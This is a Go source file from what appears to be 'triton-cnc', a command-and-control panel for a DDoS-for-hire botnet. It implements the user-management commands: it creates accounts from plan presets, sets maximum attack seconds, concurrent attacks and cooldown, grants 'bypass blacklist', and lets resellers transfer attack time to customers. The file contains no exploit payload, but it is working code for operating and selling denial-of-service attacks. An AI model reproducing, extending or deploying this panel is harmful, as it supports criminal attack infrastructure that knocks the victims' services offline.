package user_Command

import (
	"strconv"
	"strings"
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/commands/users/edit"
	"triton-cnc/core/sessions/commands/users/list"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/client/terminal"
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/json/meta"
	"fmt"
    // "os/exec"
	// "triton-cnc/core/attack/launch"
	//"os"

	"golang.org/x/term"
	// "log"
)

//
func init() {


	Register(&Command{
		Name:        "user",
		Description: "查看用户信息",
		Admin:      true,
		Reseller:    true,
		Vip:        false,
		Execute: func(session *sessions.Session_Store, cmd []string) error {
			if len(cmd) < 2 {
				session.Channel.Write([]byte("用法: user [username]\r\n"))
				return nil
			}
	
			username := cmd[1]
			user, err := database.GetUser(username)
			if err != nil {
				session.Channel.Write([]byte(fmt.Sprintf("错误: 找不到用户 %s\r\n", username)))
				return nil
			}

			expiryTime := time.Unix(user.PlanExpiry, 0).UTC()
			formattedTime := expiryTime.Format("2006-01-02") // 只输出日期
			
	
			// 格式化用户信息并输出/
			session.Channel.Write([]byte(fmt.Sprintf("ID: %d\r\n", user.ID)))
			session.Channel.Write([]byte(fmt.Sprintf("用户名: %s\r\n", user.Username)))
			session.Channel.Write([]byte(fmt.Sprintf("管理员: %t\r\n", user.Administrator)))
			session.Channel.Write([]byte(fmt.Sprintf("经销商: %t\r\n", user.Reseller)))
			session.Channel.Write([]byte(fmt.Sprintf("VIP: %t\r\n", user.Vip)))
			session.Channel.Write([]byte(fmt.Sprintf("已封禁: %t\r\n", user.Banned)))
			session.Channel.Write([]byte(fmt.Sprintf("最大攻击时间: %d\r\n", user.Maxtime)))
			session.Channel.Write([]byte(fmt.Sprintf("并发攻击数量: %d\r\n", user.Concurrents)))
			session.Channel.Write([]byte(fmt.Sprintf("最大 Session 数量: %d\r\n", user.MaxSessions)))
			session.Channel.Write([]byte(fmt.Sprintf("节能模式: %t\r\n", user.PowerSavingExempt)))
			session.Channel.Write([]byte(fmt.Sprintf("绕过黑名单: %t\r\n", user.BypassBlacklist)))
			session.Channel.Write([]byte(fmt.Sprintf("计划到期时间: %s\r\n", formattedTime)))
			session.Channel.Write([]byte(fmt.Sprintf("剩余攻击时间: %d\r\n", user.Cooldown)))
			// ... 输出其他用户信息
			return nil
		},
	})


	Register(&Command{
		Name: "users",

		Description: "edit user feilds",

		Admin: true,
		Reseller: true,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {



			if len(cmd) < 2 {
				if Session.User.Reseller{
					// Reseller 不能使用 "users" 命令获取用户列表
                    Session.Channel.Write([]byte("\x1b[0m经销商无法使用此命令列出用户。\r\n"))
                    return nil
				}
				list_users.ListUser(Session)
				return nil
			}

			switch cmd[1] {

			case "create", "add":

				if len(cmd) > 2 {
					Session.Channel.Write([]byte("\x1b[0mNote -> Username should be short and easy to remember!\r\n"))

					Term := term.NewTerminal(Session.Channel, "\x1b[0musername>")
	
					Username, error := Term.ReadLine()
					if error != nil {
						Session.Channel.Write([]byte("\r\n"))
						return nil
					}
	
					Row := database.CheckUser(Username)
					if !Row {
						Session.Channel.Write([]byte("\x1b[0mWarning -> AAAAs user already exists with that username!\r\n"))
						return nil
					}
	
					Session.Channel.Write([]byte("Note -> Password should be long and easy to remember but hard to guess!\r\n"))
	
					Term = term.NewTerminal(Session.Channel, "\x1b[0mpassword>")
	
					Password, error := Term.ReadLine()
					if error != nil {
						Session.Channel.Write([]byte("\r\n"))
						return nil
					}

					Preset := GetPreset(cmd[2])
					if Preset == nil {
						Session.Channel.Write([]byte("\x1b[0mWarning -> Plan preset doesn't exist correctly!\r\n"))
						return nil
					}

					added := database.CreateUser(&database.User{
						Username: Username,
						Password: Password,
						NewAccount: true,
						Administrator: Preset.Admin,
						Reseller: Preset.Reseller,
						Vip: Preset.VIP,
						Banned: Preset.Banned,
						Maxtime: Preset.MaxTime,
						Cooldown: Preset.Cooldown,
						Concurrents: Preset.Concurrents,
						MaxSessions: Preset.MaxSessions,
						PowerSavingExempt: Preset.PowerSavingExempt,
						BypassBlacklist: Preset.BypassBlacklist,
						PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(Preset.DefaultDays)).Unix(),
					})

					if added != nil {
						Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
						return nil
					}
					Session.Channel.Write([]byte("\x1b[38;5;2mUser has been correctly created and added into sql\x1b[0m\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("\x1b[0mNote -> 设置新用户的用户名!\r\n"))

				Term := term.NewTerminal(Session.Channel, "\x1b[0musername>")

				Username, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				Row := database.CheckUser(Username)
				if !Row {
					Session.Channel.Write([]byte("\x1b[0mWarning -> 该用户名已存在!\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> 设置新用户的密码!\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mpassword>")

				Password, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> 设置最大攻击秒数，最小值`0`最大值`86400` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mmaxTime>")

				MaxTime, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				MaxTimeINT, error := strconv.Atoi(MaxTime)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> 最大攻击秒数必须是整数\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> 请设置账户的冷却时间，最小 `0` 最大 `86400` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mcooldown>")


				Cooldown, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}
				CooldownINT, error := strconv.Atoi(Cooldown)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> cooldown must be a int\r\n"))
					return nil
				}

				if Session.User.Reseller {
					
					CooldownINT = 0 // 如果是经销商，默认冷却时间为 0
					
					Session.Channel.Write([]byte("\x1b[0m提示：经销商创建的用户默认时间为 0。\r\n"))
				}

				// Cooldown, error := Term.ReadLine()
				// if error != nil {
				// 	Session.Channel.Write([]byte("\r\n"))
				// 	return nil
				// }

				// CooldownINT, error := strconv.Atoi(Cooldown)
				// if error != nil {
				// 	Session.Channel.Write([]byte("Warning -> cooldown must be a int\r\n"))
				// 	return nil
				// }

				Session.Channel.Write([]byte("Note -> 请设置可同时攻击的并发数，最小 `0` 最大 `9999` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mconcurrents>")

				Concurrents, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				ConcurrentsINT, error := strconv.Atoi(Concurrents)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> 并发数的值只能是整数\r\n"))
					return nil
				}

				

				error = database.CreateUser(&database.User{Username: Username, Password: Password, Maxtime: MaxTimeINT, Cooldown: CooldownINT, Concurrents: ConcurrentsINT, NewAccount: true, Administrator: build.Config.UserDefaults.Admin, Reseller: build.Config.UserDefaults.Reseller, Vip: build.Config.UserDefaults.VIP, Banned: Session.User.Banned, MaxSessions: Session.User.MaxSessions, PowerSavingExempt: Session.User.PowerSavingExempt, BypassBlacklist: Session.User.BypassBlacklist, PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(build.Config.UserDefaults.DefaultDaysLeft)).Unix()})
				if error != nil {
					Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
					return nil
				}
				Session.Channel.Write([]byte("\x1b[38;5;2m用户创建成功\x1b[0m\r\n"))
				return nil
			case "admin=true":
				if Session.User.Reseller {
                    // Reseller 不能修改管理员权限
                    Session.Channel.Write([]byte("\x1b[0m经销商不能修改管理员权限。\r\n"))
                    return nil
                }
				users_edit.MakeAdmin(Session, cmd)
				return nil

			case "admin=false":
				if Session.User.Reseller {
                    // Reseller 不能修改管理员权限
                    Session.Channel.Write([]byte("\x1b[0m经销商不能修改管理员权限。\r\n"))
                    return nil
                }
				users_edit.RemoveAdmin(Session, cmd)
				return nil

			case "reseller=false":
				if Session.User.Reseller {
                    // Reseller 不能修改管理员权限
                    Session.Channel.Write([]byte("\x1b[0m经销商不能修改管理员权限。\r\n"))
                    return nil
                }
				users_edit.RemoveReseller(Session, cmd)
				return nil

			case "reseller=true":
				if Session.User.Reseller {
                    // Reseller 不能修改管理员权限
                    Session.Channel.Write([]byte("\x1b[0m经销商不能修改管理员权限。\r\n"))
                    return nil
                }
				users_edit.MakeReseller(Session, cmd)
				return nil

			case "vip=false":
				users_edit.Removevip(Session, cmd)
				return nil

			case "vip=true":
				users_edit.Makevip(Session, cmd)
				return nil

			case "ban":
				if Session.User.Reseller {
					// 获取目标用户信息
                    targetUser, err := database.GetUser(cmd[2])
                    if err != nil {
                        Session.Channel.Write([]byte(fmt.Sprintf("Error: 用户 %s 没有找到.\r\n", cmd[2])))
                        return nil
                    }
					if targetUser.Administrator {
                        // Reseller 不能删除管理员帐户
                    	Session.Channel.Write([]byte("\x1b[0m经销商不能封禁管理员帐户。\r\n"))
                    	return nil
                    }
                    
                }
				users_edit.BanUser(Session, cmd)
				return nil

			case "unban":
				users_edit.RevokeBan(Session, cmd)
				return nil

			case "remove":
				if Session.User.Reseller {
					// 获取目标用户信息
                    targetUser, err := database.GetUser(cmd[2])
                    if err != nil {
                        Session.Channel.Write([]byte(fmt.Sprintf("Error: 用户 %s 没有找到.\r\n", cmd[2])))
                        return nil
                    }
					if targetUser.Administrator {
                        // Reseller 不能删除管理员帐户
                    	Session.Channel.Write([]byte("\x1b[0m经销商不能删除管理员帐户。\r\n"))
                    	return nil
                    }
                    
                }
				users_edit.RemoveAccount(Session, cmd)
				return nil

			case "powersaving=true":
				users_edit.MakePowerSaving(Session, cmd)
				return nil

			case "powersaving=false":
				users_edit.RevokePowerSavingExempt(Session, cmd)
				return nil

			case "bypassblacklist=true":
				users_edit.MakeBypassBlacklist(Session, cmd)
				return nil

			case "bypassblacklist=false":
				users_edit.RevokeBypassBlacklist(Session, cmd)
				return nil


			}

			StringSep := strings.Split(cmd[1], "=")
			if len(StringSep) <= 1 {
				var CommandCSM = map[string]string {
					"sub_command":cmd[1],
				}
				terminal.Banner("sub_command-404", Session.User, Session.Channel, true, false, CommandCSM)
				return nil
			}

			switch StringSep[0] {

			case "maxtime":
				users_edit.AttackTimeChange(Session, cmd, StringSep)
				return nil
			case "addtime":
				if Session.User.Reseller{

					targetUser, err := database.GetUser(cmd[2])
                    if err != nil {
                        Session.Channel.Write([]byte(fmt.Sprintf("Error: 用户 %s 没有找到.\r\n", cmd[2])))
                        return nil
                    }
					if targetUser.Administrator {
                        // Reseller 不能删除管理员帐户
                    	Session.Channel.Write([]byte("\x1b[0m无法设置管理员账户。\r\n"))
                    	return nil
                    }
					if targetUser.Reseller {
                        // Reseller 不能删除管理员帐户
                    	Session.Channel.Write([]byte("\x1b[0m无法设置经销商账户。\r\n"))
                    	return nil
                    }



					cooldownChange, err := strconv.Atoi(StringSep[1])
					if err != nil {
                        Session.Channel.Write([]byte("无效时间值。\r\n"))
                        return nil
                    }
					if cooldownChange > int(Session.User.Cooldown) {
                        Session.Channel.Write([]byte("您当前的时间不足，无法分配给其他用户。\r\n"))
                        return nil
                    }
					// // 构建新的命令参数，用于减少 Reseller 的冷却时间
                    // newCmd := []string{"users", fmt.Sprintf("cooldown=-%d", cooldownChange), Session.User.Username}

                    // // 使用 CooldownTimeChange 函数减少 Reseller 的冷却时间
                    // users_edit.CooldownTimeChange(Session, newCmd, StringSep)

					// 减少 Reseller 的冷却时间
					Session.User.Cooldown -= cooldownChange
					database.EditFeild(Session.User.Username, "Cooldown", strconv.Itoa(int(Session.User.Cooldown)))

                    // 将新的冷却时间拼接到命令参数中，用于修改目标用户的冷却时间
                    // cmd = append(cmd, strconv.Itoa(cooldownChange))

                    // 调用 CooldownTimeChange 函数，修改目标用户的冷却时间
                    users_edit.CooldownTimeChange(Session, cmd, StringSep)
					Session.Channel.Write([]byte("给用户充值成功。\r\n"))
                    return nil
				}else{
					users_edit.CooldownTimeChange(Session, cmd, StringSep)
					return nil
				}
			
				
			case "settime":
				if Session.User.Reseller {
                    Session.Channel.Write([]byte("权限不足。\r\n"))
					return nil
                }
				users_edit.SetTime(Session, cmd, StringSep)
				return nil

			case "concurrents":
				users_edit.ConcurrentChange(Session, cmd, StringSep)
				return nil

			case "maxsessions":
				users_edit.MaxSessionLimitChange(Session, cmd, StringSep)
				return nil

			case "add_days":
				users_edit.AddDays(Session, cmd, StringSep)
				return nil
			case "add_minutes":
				users_edit.AddMinutes(Session, cmd, StringSep)
				return nil
			}

			var CommandCSM = map[string]string {
				"sub_command":cmd[1],
			}
			terminal.Banner("sub_command-404", Session.User, Session.Channel, true, false, CommandCSM)


			return nil
		},
	})
}

func GetPreset(name string) *meta.Presets {

	for I := 0; I < len(build.PlanPresets.Preset); I++ {
		if name == build.PlanPresets.Preset[I].Name {
			return &build.PlanPresets.Preset[I]
		}
	}

	return nil
}